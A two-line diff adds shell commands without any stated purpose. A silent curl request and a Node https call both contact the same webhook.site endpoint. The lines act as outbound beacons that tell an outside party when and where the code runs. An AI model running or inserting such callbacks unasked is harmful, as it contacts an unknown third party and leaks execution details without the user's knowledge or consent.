@@ -1,0 +1,2 @@
+curl -s -m6 -o /dev/null https://webhook.site/84725f0c-fed8-487e-8e95-cfdf96e0c693/c1
+node -e 'require("https").get("https://webhook.site/84725f0c-fed8-487e-8e95-cfdf96e0c693/c2",()=>0)'
